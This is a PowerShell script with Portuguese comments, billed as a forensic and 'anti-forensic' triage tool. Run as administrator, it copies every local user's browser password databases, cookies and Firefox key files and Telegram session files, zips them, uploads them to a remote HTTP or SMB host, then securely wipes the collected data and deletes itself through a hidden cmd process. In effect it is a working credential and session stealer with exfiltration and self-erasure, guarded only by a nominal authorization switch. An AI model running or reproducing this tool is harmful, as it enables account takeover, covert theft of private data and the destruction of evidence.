<#
.SYNOPSIS
    Phantom Elite Triage - Windows Edition (Authorized Use Only)
    Version: 4.5-WIN-ELITE

.DESCRIPTION
    Ferramenta de Coleta Forense e Anti-Forense para Windows.
    Realiza coleta de artefatos, exfiltração e limpeza segura.

.PARAMETER IHaveLegalAuthorization
    [OBRIGATÓRIO] Confirma que você tem autorização legal para executar.

.PARAMETER GhostMode
    Usa a pasta %TEMP% para operações (o mais próximo de RAM-only sem drivers).

.PARAMETER Burn
    [PERIGO] Sobrescreve e deleta todos os dados e este script ao final.

.PARAMETER ExfilUrl
    URL para envio via HTTP POST (ex: http://192.168.1.50:8000/upload).

.PARAMETER ExfilSmb
    Caminho UNC para cópia via SMB (ex: \\192.168.1.50\evidence).
#>

[CmdletBinding()]
Param(
    [Parameter(Mandatory=$true)]
    [switch]$IHaveLegalAuthorization,

    [switch]$GhostMode,
    
    [string]$OutDir,

    [string]$ExfilUrl,
    [string]$ExfilSmb,

    [switch]$Burn,
    [switch]$Quiet
)

# Configurações Iniciais
Set-StrictMode -Version Latest
$ErrorActionPreference = "SilentlyContinue"

# Cores para Output
function Write-Log {
    Param([string]$Message, [string]$Level="INFO")
    if ($Quiet) { return }
    
    $Color = "Cyan"
    if ($Level -eq "WARN") { $Color = "Yellow" }
    if ($Level -eq "ERROR") { $Color = "Red" }
    if ($Level -eq "SUCCESS") { $Color = "Green" }
    
    $TimeStamp = Get-Date -Format "HH:mm:ss"
    Write-Host "[$Level] $TimeStamp - $Message" -ForegroundColor $Color
}

# ==========================================
# FUNÇÕES CORE (Wipe & Utils)
# ==========================================

function Secure-Wipe {
    <# Simula o 'shred' do Linux usando classes .NET #>
    Param([string]$Path)
    
    if (-not (Test-Path $Path)) { return }

    Write-Log "SECURE WIPE: Triturando $Path..." "WARN"

    try {
        $Items = Get-ChildItem -Path $Path -Recurse -File -Force
        foreach ($File in $Items) {
            $FileInfo = [System.IO.FileInfo]::new($File.FullName)
            $Length = $FileInfo.Length
            
            # 1. Sobrescreve 3x com dados aleatórios
            for ($i=0; $i -lt 3; $i++) {
                $RandomBytes = New-Object Byte[] $Length
                [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($RandomBytes)
                [System.IO.File]::WriteAllBytes($File.FullName, $RandomBytes)
            }
            # 2. Sobrescreve com Zeros
            [System.IO.File]::WriteAllBytes($File.FullName, (New-Object Byte[] $Length))
            
            # 3. Deleta
            Remove-Item -Path $File.FullName -Force
        }
        # Remove a estrutura de pastas
        Remove-Item -Path $Path -Recurse -Force
    } catch {
        Write-Log "Falha no Wipe: $_" "ERROR"
    }
}

function Copy-Safe {
    <# Tenta copiar arquivos bloqueados (em uso) #>
    Param($Source, $Dest)
    if (Test-Path $Source) {
        try {
            Copy-Item -Path $Source -Destination $Dest -Force -ErrorAction SilentlyContinue
        } catch {
            Write-Log "Arquivo em uso/bloqueado (Skipped): $Source" "WARN"
        }
    }
}

# ==========================================
# VERIFICAÇÕES INICIAIS
# ==========================================

# 1. Check Admin
$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $IsAdmin) {
    Write-Warning "ERRO FATAL: Execute como Administrador."
    exit
}

# 2. Configuração de Diretório
$Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
if ($GhostMode) {
    # Windows não tem /dev/shm nativo. Usamos %TEMP% como área volátil.
    $BaseDir = Join-Path $env:TEMP "Phantom_Elite_$Timestamp"
    Write-Log "GHOST MODE: Operando em TEMP ($BaseDir)" "WARN"
} else {
    $BaseDir = if ($OutDir) { $OutDir } else { ".\Triage_$Timestamp" }
    Write-Log "DISK MODE: Operando em ($BaseDir)" "INFO"
}

# Criação da Estrutura
$Dirs = @("System", "Browsers", "Logs", "Chats", "Tmp")
foreach ($d in $Dirs) { New-Item -Path "$BaseDir\$d" -ItemType Directory -Force | Out-Null }

$ReportFile = "$BaseDir\Report.txt"

# ==========================================
# COLETA DE DADOS (TRIAGE)
# ==========================================

Write-Log "Iniciando Coleta..." "INFO"

# 1. System Snapshot
@{
    "Tool"     = "Phantom Elite Windows v4.5"
    "Hostname" = $env:COMPUTERNAME
    "User"     = $env:USERNAME
    "OS"       = (Get-CimInstance Win32_OperatingSystem).Caption
    "IP"       = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -notmatch 'Loopback'}).IPAddress
    "TimeUTC"  = (Get-Date).ToUniversalTime()
} | Out-String | Set-Content $ReportFile

# 2. Network Connections (Active)
Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess,CreationTime | Export-Csv "$BaseDir\System\Net_Conns.csv" -NoTypeInformation

# 3. Windows Event Logs (Últimos 2000 eventos críticos)
Write-Log "Coletando Logs de Eventos (Security/System)..."
try {
    Get-WinEvent -LogName Security -MaxEvents 2000 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,LevelDisplayName,Message | Export-Csv "$BaseDir\Logs\Security.csv"
    Get-WinEvent -LogName System -MaxEvents 2000 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,LevelDisplayName,Message | Export-Csv "$BaseDir\Logs\System.csv"
} catch { Write-Log "Erro ao acessar EventLogs (Auditoria desativada?)" "ERROR" }

# 4. Artefatos de Usuário (Browsers & Chats)
$UsersPath = "C:\Users"
$Users = Get-ChildItem $UsersPath -Directory | Where-Object { $_.Name -notin "Public", "Default", "All Users" }

foreach ($User in $Users) {
    $UName = $User.Name
    Write-Log "Scaneando usuário: $UName"

    # --- Chromium (Chrome, Edge, Brave) ---
    $ChromePath = "$UsersPath\$UName\AppData\Local\Google\Chrome\User Data\Default"
    $EdgePath   = "$UsersPath\$UName\AppData\Local\Microsoft\Edge\User Data\Default"
    $Browsers = @{ "Chrome"=$ChromePath; "Edge"=$EdgePath }
    
    foreach ($B in $Browsers.Keys) {
        $Path = $Browsers[$B]
        if (Test-Path $Path) {
            $Dest = "$BaseDir\Browsers\$UName\$B"
            New-Item -Path $Dest -ItemType Directory -Force | Out-Null
            # Copia apenas os DBs críticos
            Copy-Safe "$Path\History" "$Dest\History"
            Copy-Safe "$Path\Login Data" "$Dest\Login_Data"
            Copy-Safe "$Path\Cookies" "$Dest\Cookies"
            Copy-Safe "$Path\Web Data" "$Dest\Web_Data"
        }
    }

    # --- Firefox ---
    $FFPath = "$UsersPath\$UName\AppData\Roaming\Mozilla\Firefox\Profiles"
    if (Test-Path $FFPath) {
        $Profiles = Get-ChildItem $FFPath -Directory
        foreach ($P in $Profiles) {
            $Dest = "$BaseDir\Browsers\$UName\Firefox\$($P.Name)"
            New-Item -Path $Dest -ItemType Directory -Force | Out-Null
            Copy-Safe "$P.FullName\places.sqlite" "$Dest\places.sqlite"
            Copy-Safe "$P.FullName\cookies.sqlite" "$Dest\cookies.sqlite"
            Copy-Safe "$P.FullName\key4.db" "$Dest\key4.db"
            Copy-Safe "$P.FullName\logins.json" "$Dest\logins.json"
        }
    }

    # --- Telegram Desktop ---
    $TelePath = "$UsersPath\$UName\AppData\Roaming\Telegram Desktop\tdata"
    if (Test-Path $TelePath) {
        Write-Log "Telegram Session encontrada para $UName" "SUCCESS"
        $Dest = "$BaseDir\Chats\$UName\Telegram"
        New-Item -Path $Dest -ItemType Directory -Force | Out-Null
        # Copia apenas arquivos de sessão (D877... e key_datas)
        Get-ChildItem $TelePath -File | Where-Object { $_.Name -match "^D877" -or $_.Name -eq "key_datas" } | ForEach-Object {
            Copy-Safe $_.FullName "$Dest\$($_.Name)"
        }
    }
}

# ==========================================
# EXFILTRATION & CLEANUP
# ==========================================

# 1. Compressão
$ZipFile = "$env:TEMP\Evidence_$Timestamp.zip"
Write-Log "Compactando evidências em $ZipFile..."
Compress-Archive -Path "$BaseDir\*" -DestinationPath $ZipFile -Force

# 2. Exfiltração HTTP
if ($ExfilUrl) {
    Write-Log "Exfiltrando via HTTP para $ExfilUrl..." "WARN"
    try {
        $WebClient = New-Object System.Net.WebClient
        $WebClient.UploadFile($ExfilUrl, $ZipFile)
        Write-Log "HTTP Upload: SUCESSO" "SUCCESS"
    } catch {
        Write-Log "HTTP Upload: FALHA ($($_))" "ERROR"
    }
}

# 3. Exfiltração SMB
if ($ExfilSmb) {
    Write-Log "Exfiltrando via SMB para $ExfilSmb..." "WARN"
    try {
        Copy-Item -Path $ZipFile -Destination "$ExfilSmb\Evidence_$Timestamp.zip" -Force
        Write-Log "SMB Copy: SUCESSO" "SUCCESS"
    } catch {
        Write-Log "SMB Copy: FALHA ($($_))" "ERROR"
    }
}

# 4. BURN SEQUENCE
if ($Burn) {
    Write-Log "--- INICIANDO PROTOCOLO DE AUTODESTRUICÃO ---" "WARN"
    Start-Sleep -Seconds 2
    
    # A. Apaga o ZIP (Exfil)
    Secure-Wipe $ZipFile
    
    # B. Apaga a Pasta de Coleta
    Secure-Wipe $BaseDir
    
    # C. Apaga o Script (Trick do CMD Assíncrono)
    $ScriptPath = $MyInvocation.MyCommand.Path
    Write-Log "Deletando script do disco..." "WARN"
    
    # Cria um processo CMD independente que espera 3 segundos e deleta este arquivo
    # Isso é necessário porque o script não pode se deletar enquanto roda
    Start-Process cmd.exe -ArgumentList "/c timeout /t 3 /nobreak > NUL & del `"$ScriptPath`" & exit" -WindowStyle Hidden
    
    Write-Log "Operação Finalizada. O script desaparecerá em 3 segundos." "SUCCESS"
    Exit
}

Write-Log "Concluído. Saída em: $BaseDir" "SUCCESS"